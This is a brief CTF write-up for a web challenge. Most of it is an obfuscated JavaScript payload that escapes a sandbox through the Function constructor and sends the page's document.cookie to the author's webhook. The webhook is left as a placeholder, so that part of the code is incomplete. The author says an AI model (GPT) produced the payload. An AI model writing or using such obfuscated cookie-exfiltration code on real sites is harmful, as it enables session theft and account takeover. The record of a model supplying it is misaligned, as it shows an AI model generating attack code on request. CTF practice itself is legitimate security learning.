---
# title: "AC CTF - silicon dioxide"

date: "2025-11-09"

author: "th3mujd11"

platform: "CTFd"

difficulty: "TBD"

category: "web"

tags: [web]

target: ""

---

# TL;DR

For this chall I abused my friend GPT and i literally got this payload which worked:)

const ctx=canvas.getContext('2d');
const A='\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072';
const B=(ctx.arc)[A][A];const C=('')[A];
const D=C['\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065'];
const E=D(114,101,116,117,114,110,32,116,104,105,115);
const g=B(E)();
const d=D(100,111,99,117,109,101,110,116),k=D(99,111,111,107,105,101),e=D(101,110,99,111,100,101,85,82,73),f=D(toDecimal(my webhook link at that moment)(wannabe function haha));
g[f](w+D(99,61)+g[e](g[d][k]));

If needed I can provide the flag but I'm lazy haha and I have to mess around again with webhook.

---

